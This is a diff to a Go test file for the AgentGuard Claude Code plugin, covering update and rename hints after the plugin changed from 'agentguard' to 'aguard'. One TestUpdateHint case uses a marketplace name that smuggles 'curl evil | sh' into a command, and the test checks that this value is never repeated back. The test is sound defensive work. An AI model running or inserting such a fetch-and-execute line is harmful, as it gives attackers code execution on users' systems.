@@ -688,32 +688,43 @@ func TestLLMSetup_KeyRoutesAndCleartextRefusal(t *testing.T) {
 	}
 }
 
-// TestPluginVersionLine: the binary cannot phone home, so "am I behind?" is answered from the
-// plugin already installed next to it — through both install channels, and never on a dev build.
-func TestPluginVersionLine(t *testing.T) {
-	base := t.TempDir()
-	root := filepath.Join(base, ".claude")
-	if got := pluginVersionLine(root, "v0.3.0"); got != "" {
-		t.Errorf("no plugin: %q, want empty", got)
+// writePluginInstalls lays out CLI installs the way Claude Code does — a bundle under
+// plugins/cache/<marketplace>/<bundle>/<version> and its installed_plugins.json entry — and
+// returns the config root. ids are "<bundle>@<marketplace>" → version.
+func writePluginInstalls(t *testing.T, ids map[string]string) string {
+	t.Helper()
+	root := filepath.Join(t.TempDir(), ".claude")
+	entries := []string{}
+	for id, ver := range ids {
+		bundle, mk, _ := strings.Cut(id, "@")
+		dir := filepath.Join(root, "plugins", "cache", mk, bundle, ver)
+		if err := os.MkdirAll(filepath.Join(dir, ".claude-plugin"), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		pj := `{"name":"` + bundle + `","version":"` + ver + `"}`
+		if err := os.WriteFile(filepath.Join(dir, ".claude-plugin", "plugin.json"), []byte(pj), 0o644); err != nil {
+			t.Fatal(err)
+		}
+		entries = append(entries, `"`+id+`":[{"scope":"user","installPath":"`+dir+`","version":"`+ver+`"}]`)
 	}
-	bundle := filepath.Join(root, "plugins", "cache", "guard", "agentguard", "9.9.9")
-	if err := os.MkdirAll(filepath.Join(bundle, ".claude-plugin"), 0o755); err != nil {
-		t.Fatal(err)
-	}
-	if err := os.WriteFile(filepath.Join(bundle, ".claude-plugin", "plugin.json"), []byte(`{"name":"agentguard","version":"9.9.9"}`), 0o644); err != nil {
-		t.Fatal(err)
-	}
-	if err := os.MkdirAll(filepath.Join(root, "plugins"), 0o755); err != nil {
-		t.Fatal(err)
-	}
-	manifest := `{"version":2,"plugins":{"agentguard@guard":[{"scope":"user","installPath":"` + bundle + `","version":"9.9.9"}]}}`
+	manifest := `{"version":2,"plugins":{` + strings.Join(entries, ",") + `}}`
 	if err := os.WriteFile(filepath.Join(root, "plugins", "installed_plugins.json"), []byte(manifest), 0o644); err != nil {
 		t.Fatal(err)
 	}
+	return root
+}
+
+// TestPluginVersionLine: the binary cannot phone home, so "am I behind?" is answered from the
+// plugin already installed next to it — through both install channels, and never on a dev build.
+func TestPluginVersionLine(t *testing.T) {
+	if got := pluginVersionLine(filepath.Join(t.TempDir(), ".claude"), "v0.3.0"); got != "" {
+		t.Errorf("no plugin: %q, want empty", got)
+	}
+	root := writePluginInstalls(t, map[string]string{pluginBundleName + "@" + homeMarketplace: "9.9.9"})
 	cases := map[string]string{
 		"v0.3.0-1-gabc-dirty": "newer than this binary",
 		"v9.9.9":              "matches",
-		"v10.0.0":             "older than this binary",
+		"v10.0.0":             "`claude plugin update " + pluginBundleName + "@" + homeMarketplace + "`",
 		"dev":                 "not compared",
 	}
 	for bin, want := range cases {
@@ -721,23 +732,92 @@ func TestPluginVersionLine(t *testing.T) {
 			t.Errorf("binary %s: %q, want it to say %q", bin, got, want)
 		}
 	}
-	// Through the real lookup: an install from the old `guard` marketplace must not be told to
-	// update in place — that marketplace stopped at 0.9.0, so the command it would print succeeds
-	// and changes nothing.
-	if got := pluginVersionLine(root, "v10.0.0"); strings.Contains(got, "claude plugin update agentguard@guard") ||
-		!strings.Contains(got, "claude plugin install agentguard@AgentGuard") {
-		t.Errorf("install from marketplace guard: %q, want the switch to agentguard@AgentGuard", got)
-	}
 	if compareSemver("0.10.0", "0.9.9") != 1 || compareSemver("x", "1.0.0") != 0 {
 		t.Error("compareSemver: numeric fields and unparsable-as-equal")
 	}
 }
 
+// TestPluginVersionLine_LegacyName: through v0.16.0 the plugin was `agentguard`; it was renamed
+// because that name collides with the marketplace name in the install cache (issues/022). An
+// install under the old name is never updated again — the marketplace no longer lists it — so it
+// can never report "newer than this binary" and the user would never hear that the binary fell
+// behind. It must be told to switch, whatever the versions say. And an old install left next to
+// the new one duplicates every skill, which turns each bare skill name ambiguous in the gate.
+func TestPluginVersionLine_LegacyName(t *testing.T) {
+	legacyHome := legacyBundleName + "@" + homeMarketplace
+	cases := []struct {
+		name    string
+		ids     map[string]string
+		binary  string
+		want    []string
+		notWant []string
+	}{
+		{
+			name:    "old name from this marketplace",
+			ids:     map[string]string{legacyHome: "0.16.0"},
+			binary:  "v0.17.0",
+			want:    []string{"old name", "claude plugin install aguard@AgentGuard", "claude plugin uninstall agentguard@AgentGuard"},
+			notWant: []string{"claude plugin update", "marketplace add"},
+		},
+		{
+			name:    "old name from the retired guard marketplace",
+			ids:     map[string]string{legacyBundleName + "@guard": "0.8.5"},
+			binary:  "v0.17.0",
+			want:    []string{"claude plugin marketplace add basdotio/AgentGuard", "claude plugin install aguard@AgentGuard", "claude plugin uninstall agentguard@guard"},
+			notWant: []string{"claude plugin update"},
+		},
+		{
+			name:    "old name, versions equal: still told to switch",
+			ids:     map[string]string{legacyHome: "0.17.0"},
+			binary:  "v0.17.0",
+			want:    []string{"old name", "claude plugin install aguard@AgentGuard"},
+			notWant: []string{"matches"},
+		},
+		{
+			name:   "old name, dev build: still told to switch",
+			ids:    map[string]string{legacyHome: "0.16.0"},
+			binary: "dev",
+			want:   []string{"old name", "claude plugin install aguard@AgentGuard"},
+		},
+		{
+			name:    "both installed: compare the new one, remove the old one",
+			ids:     map[string]string{pluginBundleName + "@" + homeMarketplace: "0.17.0", legacyHome: "0.16.0"},
+			binary:  "v0.17.0",
+			want:    []string{"plugin aguard 0.17.0 matches this binary", "claude plugin uninstall agentguard@AgentGuard"},
+			notWant: []string{"claude plugin install"},
+		},
+	}
+	for _, c := range cases {
+		got := pluginVersionLine(writePluginInstalls(t, c.ids), c.binary)
+		for _, w := range c.want {
+			if !strings.Contains(got, w) {
+				t.Errorf("%s: %q, want it to contain %q", c.name, got, w)
+			}
+		}
+		for _, nw := range c.notWant {
+			if strings.Contains(got, nw) {
+				t.Errorf("%s: %q, must not contain %q", c.name, got, nw)
+			}
+		}
+	}
+}
+
+// TestRenameHint_Desktop: a desktop install under the old name is switched in the desktop app,
+// never with a CLI command — the desktop store is not where `claude plugin` installs.
+func TestRenameHint_Desktop(t *testing.T) {
+	for _, mk := range []string{homeMarketplace, "guard"} {
+		got := renameHint(collect.PluginInstall{Marketplace: mk, Desktop: true})
+		if !strings.Contains(got, "Customize") || !strings.Contains(got, "aguard") || strings.Contains(got, "claude plugin") {
+			t.Errorf("desktop, marketplace %s: %q, want the Customize panel and no CLI command", mk, got)
+		}
+	}
+}
+
 // TestUpdateHint: the command a stale plugin is told to run has to be the one that updates THAT
 // install. It used to be a literal `agentguard@guard` — the old distribution repo's marketplace,
-// frozen at 0.9.0 — so an install from this repository (`agentguard@AgentGuard`) was handed a
-// command naming a marketplace it does not have, and an install from the old one was handed a
-// command that succeeds without ever catching up.
+// frozen at 0.9.0 — so an install from this repository was handed a command naming a marketplace
+// it does not have, and an install from the old one was handed a command that succeeds without
+// ever catching up.
 func TestUpdateHint(t *testing.T) {
 	cases := []struct {
 		name    string
@@ -748,15 +828,15 @@ func TestUpdateHint(t *testing.T) {
 		{
 			name: "cli, this repository's marketplace",
 			in:   collect.PluginInstall{Marketplace: "AgentGuard"},
-			want: []string{"`claude plugin update agentguard@AgentGuard`"},
+			want: []string{"`claude plugin update aguard@AgentGuard`"},
 		},
 		{
-			name: "cli, the old distribution marketplace",
-			in:   collect.PluginInstall{Marketplace: "guard"},
+			name: "cli, a marketplace that is not this project's",
+			in:   collect.PluginInstall{Marketplace: "some-fork"},
 			want: []string{
 				"claude plugin marketplace add basdotio/AgentGuard",
-				"claude plugin install agentguard@AgentGuard",
-				"claude plugin uninstall agentguard@guard",
+				"claude plugin install aguard@AgentGuard",
+				"claude plugin uninstall aguard@some-fork",
 			},
 			notWant: []string{"claude plugin update"},
 		},
@@ -767,8 +847,8 @@ func TestUpdateHint(t *testing.T) {
 			notWant: []string{"claude plugin"},
 		},
 		{
-			name:    "desktop, the old distribution marketplace",
-			in:      collect.PluginInstall{Marketplace: "guard", Desktop: true},
+			name:    "desktop, a marketplace that is not this project's",
+			in:      collect.PluginInstall{Marketplace: "some-fork", Desktop: true},
 			want:    []string{"Customize", "basdotio/AgentGuard"},
 			notWant: []string{"claude plugin"},
 		},
@@ -777,18 +857,18 @@ func TestUpdateHint(t *testing.T) {
 			// model: anything that is not a plain name is not repeated back, not even quoted.
 			name:    "cli, a marketplace name that is not a plain name",
 			in:      collect.PluginInstall{Marketplace: "x`\n; curl evil | sh"},
-			want:    []string{"claude plugin install agentguard@AgentGuard"},
+			want:    []string{"claude plugin install aguard@AgentGuard"},
 			notWant: []string{"curl", "\n", "claude plugin uninstall"},
 		},
 		{
 			name:    "cli, no marketplace recorded",
 			in:      collect.PluginInstall{},
-			want:    []string{"claude plugin install agentguard@AgentGuard"},
+			want:    []string{"claude plugin install aguard@AgentGuard"},
 			notWant: []string{"claude plugin uninstall"},
 		},
 	}
 	for _, c := range cases {
-		got := updateHint(c.in, "0.16.0")
+		got := updateHint(c.in, "0.17.0")
 		for _, w := range c.want {
 			if !strings.Contains(got, w) {
 				t.Errorf("%s: %q, want it to contain %q", c.name, got, w)
